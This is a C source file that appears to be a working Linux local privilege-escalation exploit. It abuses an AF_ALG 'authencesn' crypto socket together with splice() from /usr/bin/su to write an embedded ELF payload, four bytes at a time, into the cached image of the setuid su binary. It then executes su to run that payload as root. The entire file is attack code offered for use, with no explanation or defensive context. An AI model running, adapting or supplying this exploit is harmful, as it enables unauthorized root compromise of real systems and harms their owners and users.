#define _GNU_SOURCE
#include <fcntl.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/if_alg.h>
#include <unistd.h>
#include <string.h>
#include <sys/sendfile.h>

extern const unsigned char elf[];
extern const size_t elf_size;

const unsigned char key[40] = {0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10};

int fd;

void inject_alg_sock(int offset, const unsigned char *data, int len) {

	int sockfd = socket(AF_ALG, SOCK_SEQPACKET, IPPROTO_IP);
	if (sockfd < 0) {
		perror("failed to create a socket");
		exit(EXIT_FAILURE);
	}

	struct sockaddr_alg sock_addr = {
		.salg_family = AF_ALG,
		.salg_type   = "aead",
		.salg_name   = "authencesn(hmac(sha256),cbc(aes))",
	};

	int ret = bind(sockfd, (struct sockaddr *) &sock_addr, sizeof(sock_addr));
	if (ret < 0) {
		perror("failed to bind to socket");
		exit(EXIT_FAILURE);
	}

	ret = setsockopt(sockfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));
	if (ret < 0) {
		perror("failed to set  algo key");
		exit(EXIT_FAILURE);
	}

	ret = setsockopt(sockfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4);
	if (ret < 0) {
		perror("failed to set  algo key");
		exit(EXIT_FAILURE);
	}

	int opsock = accept(sockfd, NULL, 0);
	if (opsock < 0) {
		perror("failed to accept socket");
		exit(EXIT_FAILURE);
	}

	unsigned char buf[8] = {
		0x41, 0x41, 0x41, 0x41,
		data[0], data[1], data[2], data[3]
	};
	struct iovec iov = {
		.iov_base = buf,
		.iov_len = sizeof(buf),
	};

	unsigned char ctrl_buf[
		CMSG_SPACE(sizeof(uint32_t)) + 
		CMSG_SPACE(sizeof(struct af_alg_iv) + 16) +
		CMSG_SPACE(sizeof(uint32_t))
	];
	memset(&ctrl_buf, 0, sizeof ctrl_buf);

	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = ctrl_buf,
		.msg_controllen = sizeof(ctrl_buf),
	};

	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);

	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
	*(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_IV;
	cmsg->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 16);

	struct af_alg_iv *iv = (struct af_alg_iv *) CMSG_DATA(cmsg);
	iv->ivlen = 16;
	memset(iv->iv, 0, 16);

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
	*(uint32_t *) CMSG_DATA(cmsg) = 8;

	ssize_t count = sendmsg(opsock, &msg, MSG_MORE);
	if (count <= 0) {
		perror("failed to create a socket");
		exit(EXIT_FAILURE);
	}

	int pipefd[2];

	ret = pipe(pipefd);
	if (ret < 0) {
		perror("failed to create a pipe");
		exit(EXIT_FAILURE);
	}

	off_t dest_off = offset + 4;
	off_t src_off = 0;
	count = splice(fd, &src_off, pipefd[1], NULL, dest_off, 0);
	if (count < 0) {
		perror("failed writing from bin to pipe");
		exit(EXIT_FAILURE);
	}

	count = splice(pipefd[0], NULL, opsock, NULL, dest_off, 0);
	if (count < 0) {
		perror("failed writing to socket");
		exit(EXIT_FAILURE);
	}

	char temp[8 + offset];
	unsigned char * t = malloc(8 + offset);
	if (!t) exit(1);

	count = recv(opsock, t, 8 + offset, 0);
	(void ) count; // recv should fail

	free(t);
	close(pipefd[1]);
	close(pipefd[0]);
	close(opsock);
	close(sockfd);
}

int main() {
	fd = open("/usr/bin/su", O_RDONLY);
	if (fd < 0) {
		perror("failed to open su bin");
		exit(EXIT_FAILURE);
	}

	for (int index = 0; index < elf_size; index += 4) {
		const unsigned char * ptr = elf + index;
		inject_alg_sock(index, ptr, 4);
	}

	close(fd);

	int ret = execve("/usr/bin/su", NULL, NULL);

	if (ret < 0) {
		perror("failed to execve su");
		exit(EXIT_FAILURE);
	}

	return EXIT_SUCCESS;
}
